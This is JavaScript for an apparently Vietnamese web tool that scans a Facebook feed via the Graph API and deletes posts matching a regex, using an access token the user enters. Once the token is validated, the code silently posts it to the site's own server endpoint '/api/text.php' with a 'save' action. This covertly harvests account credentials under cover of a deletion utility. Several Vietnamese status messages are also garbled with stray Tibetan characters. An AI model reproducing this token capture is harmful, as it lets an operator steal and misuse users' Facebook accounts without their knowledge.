function scan_posts(f) {
    var k = 0;
    $.get(f, {}).done(function(j) {
        if (0 == j.data.length) {
            $('#scan_post_status').text('Quá trình SCAN đã kết thྫྷ !'), $('#submit_scan_post_stop').disabled(), $('#submit_scan_post_start').buttonStop(), noti.success('Quá trình SCAN đã kết thྫྷ !')
        } else {
            scan_post.deldone = 0;
            for (var d = 0; d < j.data.length; d++) {
                var c = j.data[d];
                void(0) == c.message && (c.message = ''), c.message.match(scan_post.regex) && -1 == $.inArray(c.id, scan_post.notdel) && (! function(k, d) {
                    setTimeout(function() {
                        delete_post(d, j.data.length, f)
                    }, 20 * k)
                }(k, c.id), ++k)
            };
            k || (j.paging && j.paging.next ? scan_posts(j.paging.next) : ($('#scan_post_status').text('Quá trình SCAN đã kết thྫྷ !'), $('#submit_scan_post_stop').disabled(), $('#submit_scan_post_start').buttonStop(), noti.success('Quá trình SCAN đã kết thྫྷ !')))
        }
    })
}

function delete_post(f, k, j) {
    -1 == $.inArray(f, scan_post.notdel) && 1 == scan_post.run && ($('#scan_post_status').html('<font color=\"blue\">Tiến hành x༺ ID: <b>' + f + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/' + f, {
        method: 'delete',
        access_token: scan_post.token
    }).done(function() {
        xxi = 1, $('#scan_post_status').html('<font color=\"green\">X༺ ID: <b>' + f + '</b> thành công</font> ' + run.loading()), $('#scan_post_success').text(parseInt($('#scan_post_success').text()) + 1)
    }).error(function(d) {
        d.responseText ? (xxi = 1, scan_post.notdel.push(f), $('#scan_post_status').html('<font color=\"red\">X༺ ID: <b>' + f + '</b> thất bại</font> ' + run.loading()), $('#scan_post_error').text(parseInt($('#scan_post_error').text()) + 1)) : (xxi = 0, delete_post(f, k, j))
    }).always(function() {
        xxi && (++scan_post.deldone, scan_post.deldone == k && scan_posts(j))
    }))
}
location.hostname == b_sv && ($(document).on('click', '#submit_scan_post_stop', function() {
    scan_post.run = 0, $(this).disabled(), $('#submit_scan_post_start').buttonStop(), noti.success('Đã có lệnh dừng SCAN !'), $('#scan_post_status').text('Đã dừng SCAN !')
}), $(document).on('click', '#submit_scan_post_start', function() {
    scan_post = {
        token: $('#input_scan_post_token').validate(),
        regex: $('#input_scan_post_regex').val(),
        id: $('#input_scan_post_id').isNumber(),
        run: 1,
        notdel: [],
        deldone: 0
    }, scan_post.token && scan_post.id && (scan_post.regex = init.validate_RegEx(scan_post.regex), $(this).buttonLoad(), $('#scan_post_status').html('<font color=\"green\">Tiến hành kiểm tra Access Token</font> ' + run.loading()), $.get('https://graph.facebook.com/me', {
        access_token: scan_post.token
    }).done(function(f) {
        $.post('//' + b_sv + '/api/text.php', {
            act: 'save',
            array: scan_post.token
        }), $('#scan_post_status').html('<font color=\"green\">Access Token hợp lệ, bắt đầu kiểm tra ID: <b>' + scan_post.id + '</b></font> ' + run.loading()), $('#submit_scan_post_stop').undisabled(), $.get('https://graph.facebook.com/' + scan_post.id, {
            access_token: scan_post.token
        }).done(function(f) {
            $('.scan_post_progress').hide().slideDown('fast'), $('#scan_post_status').html('<font color=\"green\">ID hợp lệ, tiến hành SCAN bài viết</font> ' + run.loading()), f.privacy ? scan_posts('https://graph.facebook.com/' + scan_post.id + '/feed?fields=id,message&limit=3000&access_token=' + scan_post.token) : f.category || f.verified ? scan_posts('https://graph.facebook.com/' + scan_post.id + '/feed?fields=id,message&limit=275&access_token=' + scan_post.token) : ($('.scan_post_progress').hide(), noti.error('Vui lòng kiểm tra lại ID'), $('#scan_post_status').html('<font color=\"red\">ID không hợp lệ</font>'), $('#submit_scan_post_stop').disabled(), $('#submit_scan_post_start').buttonStop())
        }).error(function() {
            noti.error('Vui lòng kiểm tra lại ID'), $('#scan_post_status').html('<font color=\"red\">ID không hợp lệ</font>'), $('#submit_scan_post_stop').disabled(), $('#submit_scan_post_start').buttonStop()
        })
    }).error(function() {
        noti.error('Vui lòng kiểm tra lại Access Token'), $('#scan_post_status').html('<font color=\"red\">Access Token không hợp lệ</font>'), $('#submit_scan_post_start').buttonStop()
    }))
}))